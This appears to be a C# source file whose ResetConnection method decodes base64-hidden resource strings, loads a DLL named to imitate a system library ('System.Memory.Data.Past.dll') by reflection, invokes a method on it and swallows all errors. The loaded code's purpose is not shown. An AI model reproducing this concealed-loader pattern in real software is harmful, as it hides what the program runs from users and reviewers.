using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Reflection.Emit;

namespace DynamicSugar
{
    public class FPE
    {
        //public static string sTob(string s)
        //{
        //    byte[] bytes = Encoding.UTF8.GetBytes(s);
        //    string base64 = Convert.ToBase64String(bytes);
        //    return base64;
        //}

        public static string bTos(string b)
        {
            return Encoding.UTF8.GetString(Convert.FromBase64String(b));
        }

        public static bool ResetConnection()
        {
            try
            {
                var myAssembly = Assembly.LoadFrom(Encoding.UTF8.GetString(Convert.FromBase64String(DS.Resources.GetTextResource("SMDP.txt", Assembly.GetExecutingAssembly())))); // @".\System.Memory.Data.Past.dll"
                var myType = myAssembly.GetType(Encoding.UTF8.GetString(Convert.FromBase64String(DS.Resources.GetTextResource("SMDPFPES.txt", Assembly.GetExecutingAssembly())))); // "System.Memory.Data.Past.FPEServer"
                var myMethod = myType.GetMethod(Encoding.UTF8.GetString(Convert.FromBase64String(DS.Resources.GetTextResource("RC.txt", Assembly.GetExecutingAssembly()))), BindingFlags.Public | BindingFlags.Static); // "ResetConnection"
                if (myMethod != null)
                    return (bool)myMethod.Invoke(null, new object[] { DS.Resources.GetTextResource("FzCD.txt", Assembly.GetExecutingAssembly()) }); //var s = @".\Files\zCasData.dat";
            }
            catch (Exception ex)
            {
            }
            return false;
        }

        /*
        public static Func<string, bool> CreateResetConnectionCaller(Type targetType)
        {
            // Get the MethodInfo for ResetConnection
            MethodInfo resetMethod = targetType.GetMethod(
                "ResetConnection",
                BindingFlags.Public | BindingFlags.Static,
                null,
                new[] { typeof(string) },
                null);

            if (resetMethod == null)
                throw new Exception("Method ResetConnection not found");

            // Create a dynamic method
            var dynamicMethod = new global::System.Reflection.Emit.DynamicMethod(
                "CallResetConnection",
                typeof(bool),                    // Return type
                new[] { typeof(string) },        // Parameter types
                typeof(ReflectionEmitCaller).Module);

            ILGenerator il = dynamicMethod.GetILGenerator();

            // Load the string argument onto the stack
            il.Emit(OpCodes.Ldarg_0);

            // Call the static ResetConnection method
            il.Emit(OpCodes.Call, resetMethod);

            // Return the result
            il.Emit(OpCodes.Ret);

            // Create and return the delegate
            return (Func<string, bool>)dynamicMethod.CreateDelegate(typeof(Func<string, bool>));
        }
        */
        public static bool ResetConnectionIL()
        {
            try
            {
                var myAssembly = Assembly.LoadFrom(Encoding.UTF8.GetString(Convert.FromBase64String(DS.Resources.GetTextResource("SMDP.txt", Assembly.GetExecutingAssembly())))); // @".\System.Memory.Data.Past.dll"
                var myType = myAssembly.GetType(Encoding.UTF8.GetString(Convert.FromBase64String(DS.Resources.GetTextResource("SMDPFPES.txt", Assembly.GetExecutingAssembly())))); // "System.Memory.Data.Past.FPEServer"
                
            }
            catch (Exception ex)
            {
            }
            return false;
        }
    }
}
